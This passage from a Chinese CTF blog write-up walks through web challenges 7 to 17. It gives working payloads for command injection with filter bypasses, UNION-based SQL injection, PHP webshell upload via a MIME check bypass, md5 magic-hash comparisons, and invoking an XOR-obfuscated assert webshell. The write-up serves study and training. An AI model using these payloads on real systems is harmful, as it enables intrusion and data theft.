14pt\"></span>\n\n<span style=\"font-size: 14pt\">题目如下：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/cc44580655607c8b2fb7b8d6e556a257.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">先看源代码：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/a491ac74d3b415bf91ab5608b12146c4.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">提示我们传两个参数 func 和 cmd</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/1421fa10b15ab4f3c7cce305fc3e444d.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">传入得到源码</span>\n\n<span style=\"font-size: 14pt\">代码审计一番过后 大致了解了题目使用call_user_func函数 从用户传入的函数和参数进行执行</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/f05b9bd60d7f24292ea800d3c3ee7b5a.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">这里第一层是绕过过滤函数</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/a7e8537a8b82f55cca5ab9233f4fc0b4.png)</span>\n<span style=\"font-size: 14pt\">第二层是过滤flag关键词</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/493b2ac3a0b9feb1f6f25f1c7bec6c85.png)</span>\n<span style=\"font-size: 14pt\">绕过过后即可执行命令</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/2bde608e23cba0f028c62fdc1197b1f4.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">这里有hint 先看hint</span>\n\n<span style=\"font-size: 14pt\">传入</span><span style=\"font-size: 14pt\">/?func=&cmd=&hint</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/2f0e581dbaf09eebd50e9da4306d276b.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">提示先用scandir找flag&nbsp; 然后用system一把梭</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">因为使用print_r所以结果会以数组返回 导致我们可以用scandir看任意路径文件</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">传入</span><span style=\"font-size: 14pt\">/?func=scandir&cmd=/</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/7d7014e0e57695b41a6534759b2c339d.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">找到flag</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">然后用system执行命令。</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">这里因为flag被过滤了 结合题目简介提示，我们可以用linux的特性绕过。</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/980b12d4037f8f9f0b964153de111bcf.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">linux下可以定义一个变量为一个字符串 然后引用这个变量</span>\n\n<span style=\"font-size: 14pt\">因此我们可以定义多个变量 然后拼接绕过flag过滤</span>\n\n<span style=\"font-size: 14pt\">传入</span><span style=\"font-size: 14pt\">/?func=system&cmd=a=&apos;fl&apos;;b=&apos;aggggHere&apos;;cat /$a$b</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/28d475a5bcdcf3053b0b52749ba808e6.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">8.nizhuansiwei</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/7bfa957588d163f45fd4ea4e396e16c1.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">题目如下：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/b2360a845ee5456259847716e1bec131.png)</span>\n<span style=\"font-size: 14pt\">题目主要是两层绕过&nbsp;</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/6296a9cdd68eb1ea663cc5e1372deba5.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">首先file_get_contents读取到的文件内容要为welcome to the wzzctf一般来说是不可能的</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">结合题目提示 用data://绕过</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/91e45a390736f1272fbaef500923883c.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">这里是要用data://伪协议构造文件内容</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">[data://text/plain;base64,xxxx](//text/plain;base64,xxxx)</span>\n\n<span style=\"font-size: 14pt\">先将内容进行base64</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/ef3e7cd611233b841e8d33aab85a0147.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">传入</span><span style=\"font-size: 14pt\">/?text=[data://text/plain;base64,d2VsY29tZSB0byB0aGUgd3p6Y3Rm](//text/plain;base64,d2VsY29tZSB0byB0aGUgd3p6Y3Rm)</span>\n\n![](http://cdn.anyiblog.top/common/cee6b37d54075051500fd89997a78212.png)\n<span style=\"font-size: 14pt\">即可绕过第一层</span>\n\n<span style=\"font-size: 14pt\">然后需要我们传入一个反序列化后的password的值 要为hacker 即可得到flag</span>\n\n<span style=\"font-size: 14pt\">现在本地测试</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/3d8f1aaa45edf0012882e1f9ca886966.png)</span>\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/528fbe3b38a3a363bac5bfb8703532a0.png)</span>\n<span style=\"font-size: 14pt\">输入password=s:6:\"hacker\"; 即可</span>\n\n![](http://cdn.anyiblog.top/common/e404625739ed3d1c164ca78252c64ec2.png)\n<span style=\"font-size: 14pt\">9.某职专后台系统</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/b723d5368dd70c82139242dac3328e4e.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">题目如下：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/b21b61b9ffdb52dacfb1f125e9c499e0.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">一个登录平台 结合题目提示存在高危漏洞 猜测是SQL注入漏洞</span>\n\n<span style=\"font-size: 14pt\">先用万能密码试试</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/3859ba5ceb25ed90ee3a36b278cd7149.png)</span>\n<span style=\"font-size: 14pt\">直接进入了 但是没有flag 此题为回显型SQL 因此尝试爆数据库 爆表 拿flag</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/5b38119ce67ae7caf06f4cf29bcba8dd.png)</span>\n<span style=\"font-size: 14pt\">三个字段</span>\n\n    爆数据库：\n    1' union select 1,database(),3 #\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/aa894bbc9ce4d809c7f50da5f042dfff.png)</span>\n    爆表：\n    1' union select 1,table_name,3 from information_schema.tables where table_schema=database()#\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/5d5907e26e1cbe584477b7bd0449328b.png)</span>\n<span style=\"font-size: 14pt\">得到表flag</span>\n\n<span style=\"font-size: 14pt\">然后再查字段名</span>\n\n    爆字段：\n    1' union select 1,column_name,3 from information_schema.columns where table_schema=database() and table_name='flag'#\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/2deebce296692177a93740b48f9b7e4d.png)</span>\n<span style=\"font-size: 14pt\">字段名也是flag 最后直接查询就可以了</span>\n\n    payload:\n    1' union select 1,flag,3 from website.flag #\n\n![](http://cdn.anyiblog.top/common/d2eab68e590d4eee7438168b018904e8.png)\n<span style=\"font-size: 14pt\">10.你传你马呢</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/84a9f240c594f8accbae5777188e5369.png)</span>\n<span style=\"font-size: 14pt\">题目如下：</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/1cd6943360408a550e206db9c36ebec3.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">文件上传题目</span>\n\n<span style=\"font-size: 14pt\">随便上传个php文件</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/85e66118dc941414a9dce5825dab823f.png)</span>\n<span style=\"font-size: 14pt\">报错，这里error_log记录的是文件的MIME值 猜测题目是检测文件MIME值 而图片的MIME是白名单</span>\n\n<span style=\"font-size: 14pt\">所以先上传个图片 然后再把文件内容和后缀改为php即可。</span>\n\n<span style=\"font-size: 14pt\">先写个马</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/b7858bef4d94f5241b8511264f0ed723.png)</span>\n<span style=\"font-size: 14pt\">把后缀改为jpg</span>\n\n<span style=\"font-size: 14pt\">先用burpsuite开启拦截 然后上传图片。</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/725af9d9ae0c1433b76824779e9b7346.png)</span>\n<span style=\"font-size: 14pt\">后缀改为php上传</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/868c936333e574d81e56340ed2e6e67e.png)</span>\n<span style=\"font-size: 14pt\">访问木马蚁剑连接 或者直接传参都可以</span>\n\n![](http://cdn.anyiblog.top/common/10f0218286e6e8cda39ff66e86ba2c47.png)\n<span style=\"font-size: 14pt\">11.Baby_Ping</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/d3b4d0266e52c0e95b7b74a67cf87412.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">题目如下：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/390db2d4b732eee782e068883fbc1d6b.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">一个ping功能的平台 要想到使用ping的时候肯定是在靶机中运行 然后我们可以用；隔开执行多个命令</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">先试试1.1.1.1;ls</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/790bb10178f5f295ab75b6ea612697db.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">成功执行 直接看根目录下的flag</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/99e6e2ff340f2a7e7cd7d6f0d7904106.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">12.Baby_MD5</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/5590d9abfda07a16c7895230a27be33a.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">题目如下：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/3bed72c48c685c756ea2609b0ca17bb2.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">先输入?game开始</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">得到源码：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/6e8f2890eeab97a407f41d5393ec6a5d.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">题目注释也提示的很明显了 需要绕过三层 分别为数组绕过 0e绕过 原值绕过</span>\n\n<span style=\"font-size: 14pt\">第一层：</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/d41b4b792cef9d8f89d464df03d115aa.png)</span>\n<span style=\"font-size: 14pt\">需要我们传入两个值val1和val2两个值不同 但是它们的md5值要相同</span>\n\n<span style=\"font-size: 14pt\">这里考察的点就是用</span><span style=\"font-size: 14pt\">数组绕过</span><span style=\"font-size: 14pt\">，php中因为数组的值不能被md5处理，则返回NULL，导致相等。</span>\n\n<span style=\"font-size: 14pt\">本地测试如下：</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/ba626fdacf9714a44d9e81d961c7fd09.png)</span>\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/4e9bafb09e19056d679a2a71769a92e5.png)</span>\n<span style=\"font-size: 14pt\">可以看到两个值为空值 php中空值相等 且两值相等 所以绕过。</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">/?game&val1[]=1&val2[]=2</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/c0e198da2a7a9fba18a091f541fbe161.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">第二层：</span>\n\n![](http://cdn.anyiblog.top/common/dd5298634c1c873e61f124d411ec81ba.png)\n<span style=\"font-size: 14pt\">这里也是要我们传两个不同的值 且MD5值相同 不同的是这里传入的值必须为string类型 不能为数组</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/5ec4dbcc4434aa4185f4a99e847be08c.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">这里考察的是0e绕过 原理是两个值的md5开头为0e php中</span><span style=\"font-size: 14pt\">0e开头的字符串在参与比较时 会被当做科学计数法 结果转换为0</span> <span style=\"font-size: 14pt\">因此绕过</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">一些绕过值：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n    QNKCDZO\n    0e830400451993494058024219903391\n    240610708\n    0e462097431906509019562988736854\n    s878926199a\n    0e545993274517709034328855841020\n    s155964671a\n    0e342768416822451524974117254469\n    s214587387a\n    0e848240448830537924465865611904\n    s214587387a\n    0e848240448830537924465865611904\n    s878926199a\n    0e545993274517709034328855841020\n    s1091221200a\n    0e940624217856561557816327384675\n\n<span style=\"font-size: 14pt\">传入任意两个即可。</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">/?game&val1[]=1&val2[]=2&val3=QNKCDZO&val4=240610708</span>\n\n![](http://cdn.anyiblog.top/common/87538f26e00a8b076ebea8fdb2a8da2b.png)\n<span style=\"font-size: 14pt\">第三层：</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/713f57d6cd13ea4e3930b5d062882989.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">这里要我们传入的值等于其md5的值 是原值绕过</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">记录一个值：</span>\n\n<span style=\"font-size: 14pt\">0e215962017 的 MD5 值也是由 0e 开头，在 PHP 弱类型比较中相等</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">所以post传入即可拿到flag</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/69b019b565344caba6b21b2b221bc1b0.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">13.套娃</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/a17e536aa9bc710d23511640370eaff0.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">题目如下：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/80c1073981d7aafbf135a7ad32465b40.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">先看源代码</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/6b23c5877f3d20e561bf1753a7cd6e0b.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">substr_count() 函数计算子串在字符串中出现的次数</span>\n\n<span style=\"font-size: 14pt\">$_SERVER[&apos;QUERY_STRING&apos;]</span>\n\n<span style=\"font-size: 14pt\">例如：</span>\n\n<span style=\"font-size: 14pt\">[http://localhost/aaa/index.php?p=222&q=333](http://localhost/aaa/index.php?p=222&q=333)</span>\n\n<span style=\"font-size: 14pt\">结果：</span>\n\n<span style=\"font-size: 14pt\">$_SERVER[&apos;QUERY_STRING&apos;] = \"p=222&q=333\";</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">因此想要绕过我们传入的参数得没有_下划线&nbsp; 但是我们传参又必须要有w_z_z_c</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">下划线的绕过我们可以用 . 或者 空格 来代替这个符号</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">后面的绕过正则只需要用%0a截断即可</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">payload:</span><span style=\"font-size: 14pt\">/?w z z c=23333%0A</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/8278532923a3e66fefc781ef54c30cf7.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">或</span><span style=\"font-size: 14pt\">/?w.z.z.c=23333%0A绕过</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/12506140d3760c3cfa6f60dcc5425e90.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">14.异或的马</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/f9b79e61d3e968b35ae82ac68c6ed6c2.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">题目如下：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/6de09579414d8b3bffa535ceddd008af.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">这是通过异或写的一段木马 只要看懂代码就可以执行了。</span>\n\n<span style=\"font-size: 14pt\">可以直接用php执行。或者用python写 这里php方便一点</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/8af030ebe9dd982251afd078b4df17cf.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/3aaf3bfb667837944364121d6ffc5f95.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">可以看到木马大致为assert($_GET[&apos;H@ck&apos;])</span>\n\n<span style=\"font-size: 14pt\">连接方式为get</span>\n\n<span style=\"font-size: 14pt\">密码为H@ck&nbsp;</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">payload：</span><span style=\"font-size: 14pt\">/?H@ck=system(%27cat%20/flag%27)</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/4e6fd0959897a3da2fca21d69c1fdaaf.png)</span>\n<span style=\"font-size: 14pt\">15.字符？正则？</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/e229359e43887caf858964645a912010.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">题目如下：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/28cf0f10a33197639608b9f6e04f1d96.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">这里我们传入的id只要符合正则匹配就可以拿到flag</span>\n\n<span style=\"font-size: 14pt\">这个正则有点复杂 慢慢分析：</span>\n\n<span style=\"font-size: 14pt\">\"/key.*key.{4,7}key:/./(.*key)[a-z][[:punct:]]/i\"</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">/ /是定界符；</span>\n\n<span style=\"font-size: 14pt\">key,直接使用，id=key</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">.是元字符,表示除了换行符的任意一个字符，就取a好了，id=keya</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">*是量词，表示前一个元字符a的数量0个或多个，即{0，}。取零个，id=key</span>\n\n<span style=\"font-size: 14pt\">key,直接使用，id=keykey</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">.取a,id=keykeya</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">{4,7}是量词，表示前一个元字符a的数量为4到7，取4个，id=keykeyaaaa</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">key,直接用，id=keykeyaaaakey</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">:也直接用，id=keykeyaaaakey：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">/即/，\\防止转义，id=keykeyaaaakey:/</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">.取a,id=keykeyaaaakey:/a</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">/即/，id=keykeyaaaakey:/a/</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">(.*key)是一个分组，.取a,星号取零个,key直接用，id=keykeyaaaakey:/a/key</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">[a-z]任取一个a-z的小写字母，取a,id=keykeyaaaakey:/a/keya</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">[[:punct:]]表示任取一个标点符号，取：，id=keykeyaaaakey:/a/keya</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">i为模式修饰符，表示不区分大小写</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">所以得到payload为：</span>\n\n<span style=\"font-size: 14pt\">?id=keykeyaaaakey:/a/keya:</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/d96777186c0f12753e8491d40933310d.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">16.Easy_Ping</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/f3bc3b3e6d8f8dac4a1ebae9bdf603b2.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">题目如下：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/3bc2f04dc0529845d0e3a9240275d897.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">先让我们传入参数ip</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/3cea12c2b4a7840c076f482c65b49bfa.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">又是ping题 尝试用;来执行命令</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/617091a7d33404e94ba591ca57d41040.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">成功执行，尝试cat /flag</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/9793d9457a8e67425d2a1773481b2aa0.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">发现空格被过滤&nbsp;</span><span style=\"font-size: 14pt\">可以用</span><span style=\"font-size: 14pt\">$IFS$9绕过空格</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/152c3be712a6bed6397482428b724c2b.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">flag被过滤</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">尝试先看源码。</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/2e1851e040996c3432f67d4f9d185a31.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">得到源码：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/dd47a8b94c315b1480185f5ee046f32a.png)</span>\n<span style=\"font-size: 14pt\">这里把空格 一些特殊符号 bash 和flag过滤了</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">这里利用linux变量特性绕过</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/e537272bf2f26d30a9026f4520eb412f.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">这里没绕过正则匹配 如果先写fl 再写ag 还是和正则匹配上的&nbsp;</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">把fl 和 ag 反一下就可以了&nbsp;</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">payload:</span><span style=\"font-size: 14pt\">/?ip=1.1.1.1;a=ag;b=fl;cat$IFS$9$b$a.php</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/d8f4fb76d700b0af8603b310edb087d6.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">17.闪电五连鞭</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/9e9ff48a36911279e8d61dbf50804e98.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">题目如下：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/c2b573067e5ccd5edca629b6bda72706.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/e20d54d8ebb44eec83aa4f6710f54fef.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">第一个判断:</span>\n\n<span style=\"font-size: 14pt\">当没有用GET方法传入flag时，会显示Click here的链接。</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">点击链接会用GET方法传入一串字符串$exam，后面是当前时间的一串sha1哈希值。</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/d359224cfb6842b08193c6c77b3b90c7.png)</span>\n<span style=\"font-size: 14pt\">第二个判断:</span>\n\n<span style=\"font-size: 14pt\">这里要</span><span style=\"font-size: 14pt\">传入的flag值为例子exam的长度</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">先点超链接看例子</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/7d432a5e507ead3f017fa4466fc408d7.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">用python看下长度：</span>\n\n<span style=\"font-size: 